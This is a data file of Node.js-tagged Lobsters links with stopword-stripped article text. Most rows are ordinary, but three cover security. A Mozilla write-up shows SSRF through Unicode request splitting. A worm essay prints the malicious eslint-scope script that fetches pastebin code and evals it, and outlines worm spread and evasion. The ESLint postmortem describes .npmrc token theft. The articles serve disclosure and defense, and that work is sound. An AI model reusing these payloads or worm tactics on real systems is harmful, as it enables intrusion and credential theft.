180,Lobsters,nodejs,Node.js programming,Security Bugs in Practice: SSRF via Request Splitting,https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/,security bug practice ssrf via request splitting,bug bug corruption unicode character http request path bug report nodejs http module bugzilla node security team vulnerability ssrf via request splitting request splitting serverside request forgery impact forging request fxa data store webpush browserid squid webfacing api server datastore service quick fix encoding email address node security team already noticed deepti followup adding additional mitigation new era ssrf grpc parameterized query thin wrapper safeurlassembler new era ssrf safeurlassembler shane tomlinson chris karlof greg guthe firefox account team,one interesting sometimes scary part job mozilla dealing security bug nt always ship perfect code nobody privileged work great team engineer security folk know deal effectively security issue arise also privileged able work open want start taking advantage share experience one best way learn write secure code get experience watching code fail practice mind planning write securitybug story involved time mozilla let start recent one bug mishandling unicode character firefox account api server could allowed attacker make arbitrary request backend data store bug corruption unicode character http request path started debugging unrelated unicodehandling issue eventually led bug report nodejs http module reporter noted making request using httpget path set server receives word reporter asking nodejs make http request particular path outgoing request actually directed different path digging detail turned issue caused lossy encoding unicode character nodejs writing http request wire although user http module typically specify request path string nodejs must ultimately output request raw byte javascript unicode string converting byte mean selecting applying appropriate unicode encoding request include body nodejs default using singlebyte encoding represent highnumbered unicode character emoji character instead truncated lowest byte internal javascript representation v cafu u bufferfrom v tostring data corruption handling user input frequently red flag underlying security issue knew codebase made outgoing http request could include user input path immediately filed confidential security bug bugzilla reached node security team info dove look place might constructing url based userprovided unicode string vulnerability ssrf via request splitting specific vulnerability worried attack called request splitting textbased protocol like http often vulnerable consider server take user input includes request internal service exposed http like get privateapi q userinputhere authorization serversecretkey server properly validate user input may possible attacker inject protocol control character directly outgoing request suppose case server accepted user input x privateapi making outgoing request server might write wire directly get privateapi qx delete privateapi authorization serversecretkey receiving service would interpret two separate http request get followed delete way know nt caller intended effect speciallycrafted user input would trick server making additional outbound request situation known serverside request forgery ssrf server may privilege attacker access internal network secret api key would increase severity issue goodquality http library typically include mitigation prevent behaviour nodejs exception attempt make outbound http request control character path percentescaped written wire httpget http examplecomrntest output get examplecomrnconnection closernrn unfortunately bug handling unicode character mean measure circumvented consider url like following contains unicode character diacritic http examplecomu u test http examplecomčċtest nodejs version lower make get request url nt escape http control character httpget http output get čċtest examplecomrnconnection closernrn resulting string encoded write wire character get truncated byte r n respectively bufferfrom http examplecomu u test tostring http examplecomrntest thus including carefullyselected unicode character request path attacker could trick nodejs writing http protocol control character wire behaviour fixed recent nodejs release throw error request path contains nonascii character nodejs version lower server make outgoing http request may vulnerable ssrf via request splitting accepts unicode data user input includes input request path outgoing http request request zerolength body get delete impact forging request fxa data store audited fxa server stack look place make http request zerolength body userprovided data request path found three place bug could triggered first support webpush signedin client provide http uri receive notification account status change server deliver making zerolength put request fortunately request made server case carry special privilege include api token bug could exploited trick fxa server making unintended request webpush notification host request would powerful one attacker could made directly second checking authenticity browserid certificate fxa server par hostname userprovided json blob fetch signing key host making get request like get wellknownbrowserid domain hostname development environment bug could thus exploited trick server making arbitrary request arbitrary hostnames fortunately production environment request sent via squid caching proxy configured strict validation rule block unexpected outgoing request prevented bug exploited case third making http request backend data store real exploitable issue practice bit background firefox account production server split webfacing api server separate internal datastore service talk mysql database like client http api http datastore sql mysql server service database api server talk datastore service plain old http turned one single place unicode data user input could make way path one request many data storage request keyed email address email address allowed contain unicode character avoid issue unicode encoding decoding two service emailrelated operation datastore api accept email hexencoded string example api server would fetch account record email test examplecom making http request data store like get simple historical oversight one operation accepted email address raw string deleting email account id xyz done via request like delete accountxyzemailstest examplecom inconsistent obvious casual inspection could cause security problem carefully validate user input coming system email address ca nt contain http control character even would automatically escaped http module email address contain unicode character test environment able create account add following strangebutvalid email address x nonascii character carefully chosen lowercased encoded produce raw byte various http control character v x bufferfrom vtolowercase tostring x adding email address account deleting could cause api server make http request datastore like delete thanks bug nodejs would written wire consolelog bufferfrom delete tostring delete get cc ssrf causing api server make extra get intend specific get request would harmless enough convince bug exploitable could potentially used trick api server making wide variety fraudulent request datastore api say create account email address user control reset password another user account operation could expressed within length limit firefox account imposes email address fortunately evidence bug actively exploited production environment also important note would possible attacker exploit bug access user firefox sync data firefox sync us strong clientside encryption ensure someone know account password access synced data quick fix encoding email address upon first encountering underlying nodejs issue reached node security team information guidance responsive confirmed known behaviour could nt changed backwardscompatibility reason would fixed thenupcoming release nodejs word would ship fix application bit twist turned already noticed discrepancy behaviour emaildeletion endpoint fantastic outreachy intern deepti fixed hexencode email address matter general code cleanliness unfortunately fix yet shipped production enact chemspill process ship production quickly possible maintain private github fork firefox account code repository exactly purpose practice process releasing fix involved syncing private repo latest release branch public repo cherrypicking fix private release branch requesting review making new release tag private repo allowing circleci build docker image deployment deploying new release staging environment running suite manual automated test guard regression rolling fix production environment took u little le hour go initial awareness underlying nodejs bug fix deployed production including time spent analysis auditing code review qa deployment think pretty solid turnaround time proud everyone firefox account team quick professional response issue followup adding additional mitigation securityrelated issue important push fix walk away instead try figure circumstance led issue whether similar issue prevented mitigated future case ultimate cause issue http textbased nature making vulnerable injectionstyle attack request splitting particular nodejs bug one example thing go wrong constructing http request recent blackhat presentation new era ssrf provides many example variety programming language opinion best longterm mitigation u move away using http internal service request towards something structured like grpc however feasible shortterm instead borrowed page playbook another classic textbased protocol long history injectionstyle attack sql modern web app never building sql query user input hand instead using technique parameterized query programmatic query builder bug like one show constructing part http request hand either confident initial fix stable working production refactored outgoing http request api server use thin wrapper around safeurlassembler package ensure final url string assembled properlyencoded component providing extra layer protection similar bug may arise future run server make outgoing http request include sort user input highly recommend taking look new era ssrf presentation get sense way go wrong eyeopening stuff make small overhead extra safety layer like safeurlassembler seem worthwhile extra peace mind thanks shane tomlinson chris karlof greg guthe reviewing initial draft post entire firefox account team among many adventure
181,Lobsters,nodejs,Node.js programming,DNS over TLS - Thoughts and Implementation,https://sagi.io/2018/09/dns-over-tls---thoughts-and-implementation/,dns tl thought implementation,hacker news dns tl tl dr server name indication plaintext long dns tl dns dnscurve hashbreaker dnscrypt dnssec heated debate answering query understanding characterizing interception dns resolution path android support dot firefox nightly support doh dns tl work link rogue ca issue valid certificate recursive resolver spki list dns tl server dnsprivacyorg android p calculates openssl implementing dns tl client entire certificate playing dns tl thought commonlyused default port google campus tel aviv web dns traffic still private server name indication plaintext long summary dns privacy project dprive working group dnsprivacyorg dns privacy workshop,discussion hacker news week discovered android p dns tl support piqued curiousity could finally dns encryption go mainstream post survey dns tl implement client share thought party like tl dr sure dns tl dns query encrypted major step forward nevertheless majority web relies sni server name indication sends domain name plaintext long created dns tl nodejs package install npm dnsovertls dns tl command line tool install npm g dnstls dns tl dns insecure allows anyone active internet tap view user query forge answer year many proposal securing dns high level description page dnscurve proposed daniel j bernstein hashbreaker provides confidentiality data transport encrypted integrity data modified undetected manner authenticity origin verified claim recursive dns server eg authoritative name server eg nsibmcom dnscrypt based dnscurve provides confidentiality integrity stub resolvers eg android phone recursive dns server eg dnssec provides authenticity integrity resolvers stub recursive authoritative name server heated debate around dnssec mainly achieve authentication new pki publickey infrastructure deployed one allows partial government control dns since tlds cctlds controlled government bottom line technicality aside adoption lie somewhere low nonexistent leaving dns potent attack vector year since created moreover evidence dns actively tampered shown recent usenix paper answering query understanding characterizing interception dns resolution path nevertheless despair recently adoption dns tl dot dns http doh gaining momentum evident android support dot firefox nightly support doh dns tl work similarly dnscrypt dns tl encrypts link stub resolver recursive resolver ensures passive sniffing active tampering dns happen link unless course underlying cryptography somehow broken link communication recursive resolvers nameservers likely remain private rising adoption dnssec least expect authenticity passive sniffing dns request recursive resolvers would possible active tampering rogue ca issue valid certificate recursive resolver possible resourceful adversary obtain valid certificate domain reason dns rfc introduces spki subject public key info pinning upon successful tl connection handshake client computes spki fingerprint public key found validated certificate chain raw public key server provides instead computed fingerprint exactly match one configured pin client continues connection normal otherwise client must treat spki validation failure nonrecoverable error simple word get detail dns tl resolver ip address hostname also get spki pin client use verify original server public key instance check list dns tl server dnsprivacyorg spki pin provided server spki pin public key part recursive certificate implementation reference look android p calculates example utilizes cli calculate spki pin dns tl server echo openssl sclient connect devnull openssl pubkey noout openssl pkey pubin outform der openssl dgst binary openssl enc implementing dns tl client dns tl simply tunnel goodold dns packet tl default tcp port tl session established client sends regular dns query server responds message prefixed two byte length field give message length excluding two byte length field client implementation one thing implemented yet spki pinning spki pin requires raw public key der certificate available nodejs older nodejs version actually get der entire certificate carving public key der delicate art feel like least playing dns tl dns tl fairly new many tool reason made dnstls dns tl command line tool default using dns tl server install usage diglike dnstls usage dnstls name type class server p port tlshost host name domain like resolve type record type eg default aaaa n txt mx cname etc class either default hsor ch port tcp port default server address server default tlshost tl hostname noted certificate default cloudflarednscom note server tlshost go hand hand instance say like use dns tl server dnstls sagiio output json response maybe diglike output future example id type response flag flagqr true opcode query flagaa false flagtc false flagrd true flagra true flagz false flagad false flagcd false rcode noerror question name sagiio type class answer name sagiio type ttl class flush false data name sagiio type ttl class flush false data authority additionals thought dns tl major step forward towards safer private world nevertheless thought commonlyused default port developed library command line client working google campus tel aviv unfortunately block outgoing tcp connection using commonly used destination port instance suspect going issue many network web dns traffic still private sure dns tl dns query encrypted major step forward nevertheless majority web relies sni server name indication sends domain name plaintext long summary like thank folk dns privacy project dprive working group effort think finally start pay interested dns privacy wealth information dnsprivacyorg invite watch nd dns privacy workshop session insightful spot error question please let know others may gain comment thought also welcome tweet
182,Lobsters,nodejs,Node.js programming,Node.js admin panels: Strapi or Express Admin?,https://www.imaginarycloud.com/blog/node-js-admin-panels-strapi-and-express-admin-reviewed/,nodejs admin panel strapi express admin,strapi express admin express admin get express admin running get module create project page express admin main feature sql relationship customisation view instance page thought express admin strapi strapi documentation strapi main feature content creation contenttypes building api role permission thought strapi overview found article interesting might like one,lately researching fast simple way develop back office javascript without need write everything scratch research found two great option strapi express admin looking upfront see main difference regarding build stack strapi admin interface built react j option deserves however much thorough analysis get know particularity take chance also provide bit information configure get running smoothly time express admin express admin let connect mysql mariadb sqlite postgresql database please note relational databaseoriented express admin configuration done json manually created file main feature sql table relationship define type table relationship internationalization possible ability create custom view event kind browserside library control allows theme bootswatch get express admin running assume already nodejs npm installed beforehand would also suggest use nvm get module sudo npm install g expressadmin postgresql run inside expressadmin folder npm install pg sqlite run inside expressadmin folder npm install create project admin pathtoconfigdir running command prompt database type port user database name password admin user admin password please note admin express requires existing database data notice admin interface running go browser access login enter main screen database one table product add new entry delete update existing one full crud express admin able read schema map json configuration file part settingsjson file generated admin see table field defined express admin build crud table database access configuration stored inside configjson want know express admin configuration go page follow listed step express admin main feature sql relationship express admin also allows configure relationship table automatically create proper field one many many many many one one one relationship go settingsjson change according need following image show example one many relationship control select true onetomany table user pk id column firstname lastname know relationship scan customisation view instance yes possible since customjson file configure custom code app path absolutepathtocustomappjs slug verbose custom view mainview show true create custom appjs view file know follow page thought express admin need admin interface crud functionality level customization express admin good solution saw allows relationship table support custom view work multiple database relational mysql mariadb sqlite postgresql database opinion express admin great option pick due simplicity customization type customization dashboard missing always fork code modify according need strapi certainly noticed express admin good admin interface good stand imagine could feature also able generate api feature user authorization authentication would great right well possible strapi next give overview strapi work get started information check strapi documentation let start installing strapi npm install strapi alpha g afterwards create new project prompted database type database name access data strapi new myproject starting project run npm run setup ready go cd myproject npm run setup strapi start access able see admin user creation screen create admin user afterwards redirected dashboard strapi main feature content creation contenttypes let jump right good stuff cover create content either use content type builder left menu generator one find explain use content type builder forget give generator try well content type simply model api connected mysql database used strapi order generate crud screen let add new content type field click add new field get strapi allows choose data type consists one interesting feature let add field description price click save thing get really interesting look generated file awesome strapi generated service model controller api course always customise according need another interesting feature ability create relationship within content type let assume one content type category want associate product adding field select relation type able choose one one one many many many relation type add product see category field show building api api automatically generated modify code according need role permission order give public access api set role permission another cool feature strapi come box role permission management plugin allow public access api change role thought strapi need admin interface also looking build serve api strapi excellent choice strapi contenttype generator excellent fulfil almost every need might always develop plugins another great feature role permission unfortunately strapi still development present bug usage community growing active github always expecting improvement overview depending requirement choose express admin want integrate admin interface app order manage data simple crud interface level customization need include building api role user permission strapi definitely choice say option excellent choice done according requirement found article interesting might like one
183,Lobsters,nodejs,Node.js programming,Blockchain implementation dummies in NodeJS,https://repl.it/@maxpert/51b7eBlockchain,blockchain implementation dummy nodejs,,
184,Lobsters,nodejs,Node.js programming,Wine bug 45749 – Visual Studio 2017 Installer fails due to node.js/libuv listen(named pipe) error,https://bugs.winehq.org/show_bug.cgi?id=45749,wine bug visual studio installer fails due nodejslibuv listen named pipe error,multiple nodejs based applicationsinstallers need ntdllntqueryinformationfile handle filemodeinformation information class m visual studio installer faceit anticheat client,multiple nodejs based applicationsinstallers need ntdllntqueryinformationfile handle filemodeinformation information class m visual studio installer faceit anticheat client first last prev next bug last search result first last prev next bug last search result
185,Lobsters,nodejs,Node.js programming,Node.js or Ruby on Rails: which is better?,https://www.imaginarycloud.com/blog/node-vs-rails/,nodejs ruby rail better,nodejsexpressjs ruby rail nodejs expressjs nodejs nodejs expressjs make product scalable nodejs backend opensource project thriving growing community make possible develop frontend backend language nodejs used nodejs easy learn expressjs build app good scalability ruby rail ruby rail convention configuration use ruby rail convention configuration productive development environment faster rate development fast learn ruby rail ruby rail still relevant strong flexible backend api nodejs expressjs v ruby rail rail provides data access right away together database schema migration support tool top pick nodejs growing fast speed scalability nodejs really shine realtime web application building api express rail ruby rail api mode http guidesrubyonrailsorgapiapphtml expressjs expressjs known minimalistic flexible one better nodejs ruby rail popularity nodejs undeniable ruby rail solid choice rail undoubtedly best need manipulate lot data database nodejs fit better want build microservices need big application lot interaction realtime app imaginary cloud nodejs ruby rail tailor approach according client goal need found article interesting might like one,post originally posted august updated march new project start always need decide approach better development numerous possibility always popular attractive upfront explore two used wellknown option development community fastgrowing nodejsexpressjs solid ruby rail nodejs expressjs nodejs nodejs runtime environment executes javascript code serverside eventdriven architecture capable asynchronous io optimizes throughput scalability web application require lot io operation currently large number framework expressjs one popular many company already changed nodejs given stream opinion announcing fall rail however solo reason adopt nodejs decision also supported desire make product scalable mainly lot user interaction speed provides nodejs backend nodejs built run engine developed google make fast comparison optionsit opensource project thriving growing community making extremely attractive tool developer also since javascript runtime many developer already familiar make possible develop frontend backend language nodejs used nodejs quite popular currently amongst bigname company namely uber netflix slack even twitter using nodejs somewhere stack nodejs easy learn asynchronous nature language may hard concept beginner programmer grasp however simplicity base javascript nodejs relies make easier split task small chunk way build piece piece testing along way end asynchronous programming might easiest thing wrap head around javascript help along way expressjs expressjs minimal flexible web application framework nodejs currently popular great choice intention build app good scalability high interaction io ruby rail ruby rail ruby rail serverside web application framework ruby according modelviewcontroller pattern provides default structure database web service webpage follows principle convention configuration help reduce number decision developer make use ruby rail principal rule language convention configuration mean programmer spend lot time configuring file get set also mean changing project easy different project still follow set rule also legibility code much problem since even syntax follow convention lead productive development environment faster rate development fast learn ruby rail ruby rail beginnerfriendly actually used several place entrylevel programming language lot work beginner good get nittygritty want control understand happening behind ruby magic ruby rail still relevant rail still relevant lot positive thing offer project current development environment always want strong flexible backend api get rail easy start developing huge community still behind hard find larger library ready use reliable component ruby gem system nodejs expressjs v ruby rail ruby rail currently mature around time one point rail clearly best application relational database relational database nodejs underdeveloped comparison rail would make look good time rail provides data access right away together database schema migration support tool top pick however nodejs growing fast become next big thing speed scalability nodejs provides two biggest advantage task require cpu usage problem something may shadow quality one single problem aspect clearly best possible choice nodejs would need case much code rail able achieve end result nodejs really shine realtime web application allows twoway connection client server start communication possible due fact us nonblocking eventdriven io keep lightweight efficient building api express rail ruby rail time ago wanted build api rail probably first option however since api mode rail scenario changed bit rail api mode meant build api sending html representation json provide smoother framework remove functionality use provide lightweight performance mean middleware turned view helper asset mode rail became reasonable option since even compared alternative functionality offer valuable competitor like sinatra provide reason people use rail provides set default allows developer get running quickly without make lot trivial decision http guidesrubyonrailsorgapiapphtml expressjs hand expressjs known minimalistic flexible designed function middleware routing framework set robust feature simplify rapid development also important highlight great documentation fast speed guaranteed engine provide benefit nodejs clearly big advantage one better nodejs ruby rail popularity nodejs undeniable fact executing javascript biggest advantage since already big community make nodejs accountable ruby ruby rail solid choice keep improving continues adapt quickly change always providing new feature answer user demand analyze interest overtime per graphic see nodejs rising ruby rail facing slow decline different dead moment however solid option come project development take time one emerges clear winner time others find place race well rail undoubtedly best need manipulate lot data database migration easily change nodejs fit better want build microservices need big application lot interaction realtime app provides speed high capability handle huge number connection imaginary cloud use technology developer specialized nodejs ruby rail allow u tailor approach according client goal need need hand software development technology team ready help drop u line found article interesting might like one
186,Lobsters,nodejs,Node.js programming,HashWick V8 Vulnerability,https://darksi.de/12.hashwick-v8-vulnerability/,hashwick vulnerability,,
187,Lobsters,nodejs,Node.js programming,Introducing Ghost 2.0,https://blog.ghost.org/2-0/,introducing ghost,dynamic card,dynamic card modern publishing mean working wide variety content type rich text rich medium still tell story word new editor also allows pull dynamic block content like photo video tweet embeds really bring story life inserting card triggered menu also familiar command help quickly insert content without leaving keyboard shipping base set commonly used card today adding support many future old markdown editor card within new editor preferred one nt worry still still work
188,Lobsters,nodejs,Node.js programming,Node.js 8 and Python 3.7 runtimes now available in Google Cloud Functions,https://cloudplatform.googleblog.com/2018/07/bringing-the-best-of-serverless-to-you.html,nodejs python runtimes available google cloud function,learn,demonstrate proficiency design build manage solution google cloud platform learn
189,Lobsters,nodejs,Node.js programming,Ndb – An improved debugging experience for Node.js,https://github.com/GoogleChromeLabs/ndb,ndb improved debugging experience nodejs,ndb installation puppeteer thread local install set npm script getting started save change disk blackboxes typical node debugging async stepping eager evaluation screenshot contributing contributing guide thanks og smtlaissezfaire githubcomsmtlaissezfairendb,ndb ndb improved debugging experience nodejs enabled chrome devtools installation compatibility ndb requires node work best node installation ndb depends puppeteer downloads recent version chromium mac linux win global install npm npm install g ndb alternatively yarn yarn global add ndb global installation may fail different permission error find help thread window user installation may fail window compilation native dependency following command may help npm install g windowsbuildtools local install want ndb available npm script eg npm run debug run ndb indexjs install development dependency local install npm npm install savedev ndb alternatively yarn yarn add ndb dev set npm script case ndb available system path getting started start debugging nodejs application using one following way use ndb instead node command ndb serverjs alternatively prepend ndb ndb node serverjs prepend ndb front binary use binary prepend ndb npm run unit ndb npm run unit debug globally installed package mocha ndb mocha use local binary use npx prepend ndb npx mocha launch ndb standalone application debug npm script packagejson eg unit test cd project folder packagejson ndb source panel npm script sidebar click selected run button use ctrlcmd r restart last run run node command within ndb integrated terminal ndb connect automatically run open script source using run script context menu item ndb connect automatically well use prof flag profile app ctrlcmd r restarts profiling ndb powerful feature exclusively nodejs child process detected attached place breakpoints module required edit file within ui ctrlscmds devtools save change disk default ndb blackboxes script outside current working directory improve focus includes node internal library like streamwrapjs asynchooksjs fsjs behaviour may changed blackbox anything outside working dir setting addition use devtools functionality used typical node debugging breakpoint debugging async stack aka long stack trace async stepping etc console toplevel await object inspection advanced filtering eager evaluation console requires node j sampling profiler memory profiler screenshot contributing check contributing guide get overview ndb development thanks og ndb early smtlaissezfaire released first serious debugger nodejs ndb package name still preserved githubcomsmtlaissezfairendb thank scott generously donating package name
190,Lobsters,nodejs,Node.js programming,How to build an npm worm,https://jamie.build/how-to-build-an-npm-worm,build npm worm,build npm worm npm nodejs reported fluke worm billion note error network activity code trust trust npm jan jan note hugops fix,build npm worm npm registry package manager javascript ship part nodejs used ten million people install hundred thousand package billion time every week today reported eslintscope npm package million downloads compromised new version package published contained malicious script attempting spread npm author type script known worm npm good job shutting lucked script contained bug prevented spreading caused get reported immediately fluke nt think anyone tried name worm yet going come name purpose post going call fluke worm since fluke type parasitic worm worm could really bad lucked cause author fucked code script cleaned readability try var http require http httpsget hostname pastebincom path header useragent window nt accept texthtml applicationxhtmlxml applicationxml response responsesetencoding responseon data content eval content responseon error error catch err author fluke tried really hard prevent error thrown going far wrapping asynchronous httpsget call synchronous trycatch still managed throw error oh javascript reliable wondering bug opened response stream listened data nt wait response closed eval uating response let fix let content responseon data chunk content chunktostring responseon end eval content script may issue important know attempting us node builtin http module order attempt make request pastebin url deleted evaluating content using pastebin author fluke could tried make update worm simply editing content luckily fluke far know seems infected one major package response npm taken published version package invalidated every npm token developer login also advising use authentication worm let take step back understand worm worm piece malicious code attempt spread many machine possible worm need something connect computer time network either public internet private intranet although go back far enough find worm spread floppy disk case thing connecting u npm npm currently claim million user user include everyone new programmer coding bootcamp multibillion dollar corporation npm also report billion individual package downloads per week package downloads week per user important worm like take advantage often people downloading code internet order spread fast possible need spread fast possible order infect everyone detected worm nt broken could infected hundred maybe even thousand package detected sophisticated could much harder kill completely let quickly talk fluke could gone order grow fast possible fluke need insert something get installed many people case targeted one eslint internal package eslint downloaded million time contributor included people also worked yarn npm alternative client responsible npm downloads babel million downloads jquery million downloads coffeescript million downloads many many note many project already taken precaution prevent taken malicious package keep traversing graph package depend one another well graph author access package nt take long infect entire registry like pretty good target get introduced well sure exactly happened case one scenario think past pretty much every major open source project least javascriptnode community automated ci run pull request ci run test provides nice feedback loop contributor since run automatically second pull request opened need careful ci process access many user npm including lot major open source project chose use continuous deployment system automatically publish new version npm package thing get merged master branch time done ci system test order publish npm need token something tell npm authenticated order publish npm automatically ci need put token environment variable time people configure environment variable way master build pull requestbranch build get environment variable mean simply opening pull request right repo gain authorization publish package cool get even easier worm infected major package anyone downloads package also infected happen logged npm registry likely majority npm user account worm easily add package publish access worm spread package point inevitably going detected may take couple hour bad case couple day could avoid detection long possible well first need know people would discover couple obvious one error bug network failure etc network activity ie locked ci network report unexpected external request code happen find code one way another welldesigned worm would know sort thing would take precaution avoid getting caught avoid error seen user trycatch etc avoid running consistently error nt reproducable user ignore avoid making request anything might suspicious appear especially secure system avoid exposing code hide somewhere else user system unlikely notice better worm hide time infect securityminded people much better job list worm presumably purpose infect although maybe someone want bragging right might want steal data might want damage machine day good chance want mine bitcoins everyone computer cryptocurrencies stupid bad nt node run full access file system network default whole lot people machine mention fact many user run npm sudo oh case worm want make sure nt get stopped early might even go far continuing fight even noticed plenty way see fluke trying using editable pastebin could keep updating code new thing right worm built autoupdate finding new creative way pain as people trying stop maybe even set daemon keep injecting package even removed trust may wondering fuck jamie teaching everyone create worm like expose entire world starter exposing entire world already happened npm allows package take action could result malicious npm package author create worm spread across majority npm ecosystem thousand people already know vulnerability vast majority completely capable exploiting reason people nt exploited far decent people something lose people start exploiting see truth massive community built built trust npm trust user wo nt anything malicious npm trust able catch anything harmful trust big deal security industry want user give control data need trust lose people trust business danger ask facebook lost billion dollar handing user data cambridge analytica many others want gain keep user trust need everything protect npm npm know security flaw alerted many time joking coo day look response npm ability build worm disclosed year ago jan npm jan confirmation work intended intention fix moment npm room something two year since despite coming regularly registry nt done much prevent almost happened today introduced authentication introduced lockfiles acquired node security startup started building auditing tool help quite bit nt solve core problem publishing longliving token worm still installed logged machine valid token publish new version package worm still take advantage postinstall script spread npm nt lock note public statement npm claimed authentication fluke would impossible implicitly blaming eslint contributor npm security design flaw however nt true fluke specifically took advantage postinstall script affected way slow spread make impossible remember requires user go way setup result user npm use ask company setup optional nt true hopefully npm share stats many user setup reason stated addressing problem head security solution would get way user harder publish npm package even harder automate see harder npm publishing mean harder npm adoption fear refusing something startup focused growth vcs undoubtably demanding growth capitalism strike guess sigh npm fix problem gon na keep risk hate hate put position bad guy trying raise awareness something important got open source fun stayed saw much improve world around u take seriously know much lose bother greatly npm private company bother npm closedsource registry server bother ca nt contribute inform community problem get hugops nt want ruin anyone npm day npm open source client would nt hug ops could contribute back know security engineer every major company day would kill opportunity improve npm security question come give private company monopoly node ecosystem refuse open source software fix reason really wanted write article want thing get better nt want worm successful community uneducated work security obscurity thankfully pretty effective dangerous build something important npm ecosystem community play vital role many people world write code nt depend security obscurity npm lost trust today find position need protect npm npm already revoked token please setup authentication make much harder introduce worm use lockfiles help prevent worm spreading fast make sure nt automating npm publishing way expose token careful dependency introduced codebase honestly amount work need put truly prevent happening never going happen ask individual user go way voluntarily secure reality wo nt wo nt even hear message need next worm might fluke
191,Lobsters,nodejs,Node.js programming,Building and publishing a module with TypeScript and Rollup.js,https://medium.com/@GRardB/building-and-publishing-a-module-with-typescript-and-rollup-js-faa778c85396,building publishing module typescript rollupjs,building publishing module typescript rollupjs npm module typescript rollup typescript rollup also believe j library authored typescript great post prerequisite note examplecom examplecom typescript configuration option go declaration file inferred rollup configuration rollup documentation publishing npm go create one email examplecom http registrynpmjsorg developing locally symbolic link thanks reading reach,building publishing module typescript rollupjsi recently decided publish npm module wrote typescript went rollup bundling first time publishing module first experience rollup like write tutorial reference anyone may find useful let get started typescript rollupi went typescript several reason use work familiar always good hone skill especially since necessarily typescript expert yet also fan type number reason compiletime error invaluable also believe j library authored typescriptas rollup mostly went never used heard good thing know number opensource project use webpack also read great post difference two rollup better building librariesprerequisitesi going using yarn use npm wish first let create packagejson inside project directory fill everything wish hit enter every step care yet always edit later yarn initfirst let install typescript rollup inside project directory well plugin allow rollup compile typescript part bundling process yarn dev add typescript rollup original rollupplugintypescript appears unmaintained using one insteadat point packagejson look something like name someproject version main indexjs author john doe jdoe examplecom license mit devdependencies rollup typescript let add extra line file replace default main name someproject version main distindexjs module distindexesjs file dist type distindexdts script build rollup c watch rollup cw author john doe jdoe examplecom license mit devdependencies rollup typescript going main module point bundled javascript library consumer may import module main commonjs module module e module need understand detail though file let npmyarn know publish rather get installed inside user nodemodules install module let dist contain bundled jstypes point typescript declaration file get compiled automatically u script handy rollup script use development yarn run build bundle module yarn run watch build every time file changesnow ready configuration typescript configurationin order configure typescript need create tsconfigjson file option go following one good enough encourage dive deeper option find unsatisfied something working copy following tsconfigjson root directory project compileroptions declaration true declarationdir dist module noimplicitany true outdir dist target include src exclude nodemodules going declaration true enable automatic generating typescript declaration file helpful typescript user using module since access type module method variable etcdeclarationdir outdir specify compiled code go using dist may choose another name lib choose different directory name make sure use name packagejson well noimplicitany true force u bit stricter type default typescript allows get away assigning type variable whose type inferred option make want something use type must done explicitlytarget allows u specify version javascript compile typescript case choosing allows u specify typescript look t dts tsx file compileexclude allows u specify directory typescript ignore come compilingrollup configurationnext configure rollupin root directory project create file called rollupconfigjs next copy import typescript pkg packagejsonexport default input srcindexts output file pkgmain format cjs file pkgmodule format e external objectkeys pkgdependencies objectkeys pkgpeerdependencies plugins typescript typescript require typescript first thing note importing packagejson necessary handy way make sure duplicating certain information filename bundle breakdown going input tell rollup look code bundle similar webpack entryoutput bundle get stored stated earlier going bundle commonjs cjs e e module rollup documentation pretty good explanation difference interestedexternal use tell rollup module exclude bundle since pkgdependencies get installed module consumer yarn npm since pkgpeerdependencies expected installed consumer safely exclude bundlethe plugins section bit weird making use locallyinstalled typescript default us version likely uptodate bunch plugins could install fine publishing npmin order publish module first need log npm account go create one need machine reason yarn login work going use npm login npm loginusername yourusernamepassword email public email examplecomlogged yourusername http registrynpmjsorgnext let create tiny module publish create src directory inside indexts file srcindextsexport const greet consolelog hello world run build command compile typescript yarn run buildyarn run rollup csrcindexts distindexjs distindexesjs created distindexjs distindexesjs done notice dist folder created three file feel free check finally publish module npm yarn publishyarn publish bumping version info current version new version logging publishing success published revoking token info revoking login token specified via config done successfully published module npm using typescript rollupto verify everything look good create another directory somewhere else computer run yarn init yarn add yourpackagename navigate nodemodulesyourpackagename see dist folder compiled file import module like import greet yourpackagenamedeveloping locallyas imagine would pretty annoying hacky publish package every time wanted test writing automated test help lot regard sometimes need actually use module make sure work properly publishing itfor use yarn link npm link course first navigate module project directory run following yarn linknext navigate project like consume module make sure module installed via yarn npm run yarn link yourpackagenamethis create symbolic link package folder inside project nodemodules directory essentially able use local version package way able use published downloadedinstalled via yarn add npm install thanks readingif made far congratulation publishing something npm hope enjoyed tutorial made mistake anything need clarification please hesitate reach like contribute npm going forward try keep tutorial uptodate
192,Lobsters,nodejs,Node.js programming,"Postmortem for Malicious Packages Published on July 12th, 2018",https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes,postmortem malicious package published july,postmortem malicious package published july summary npm revoked affected package attack method recommendation lastpass enable npm twofactor authentication issue timeline incident early morning july utc utc utc utc eslinteslintscope utc utc utc utc link,postmortem malicious package published july july attacker compromised npm account eslint maintainer published malicious version eslintscope eslintconfigeslint package npm registry installation malicious package downloaded executed code pastebincom sent content user npmrc file attacker npmrc file typically contains access token publishing npmthe malicious package version eslintscope eslintconfigeslint unpublished npm pastebincom paste linked package also taken downnpm revoked access token issued utc result access token compromised attack longer usablethe maintainer whose account compromised reused npm password several site twofactor authentication enabled npm accountwe eslint team sorry allowing happen hope package maintainer learn mistake improve security whole npm ecosystemaffected packagesif run npm registry unpublish malicious version package already unpublished npmjscom registryattack methodfurther detail attack found hererecommendationswith hindsight incident recommendation npm package maintainer user future package maintainer user avoid reusing password across multiple different site password manager like lastpass help thispackage maintainer enable npm twofactor authentication npm guide hereif use lerna follow issuepackage maintainer audit limit number people access publish npmpackage maintainer careful using service automerge dependency upgradesapplication developer use lockfile packagelockjson yarnlock prevent autoinstall new packagestimelinebefore incident attacker presumably found maintainer reused email password thirdparty breach used log maintainer npm accountearly morning july attacker generated authentication token maintainer npm utc attacker used generated authentication token publish eslintconfigeslint contained malicious postinstall script attempt exfiltrate local machine npmrc authentication utc attacker unpublished eslintconfigeslint utc attacker published eslintscope contained malicious postinstall utc user posted eslinteslintscope notifying eslint team utc pastebincom link containing malicious code taken utc npm team unpublished eslintscope contacted eslint utc eslint team published eslintscope code eslintscope cache could pick new utc npm revoked access token generated utclinks
193,Lobsters,nodejs,Node.js programming,Virus in eslint-scope,https://github.com/eslint/eslint-scope/issues/39,virus eslintscope,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
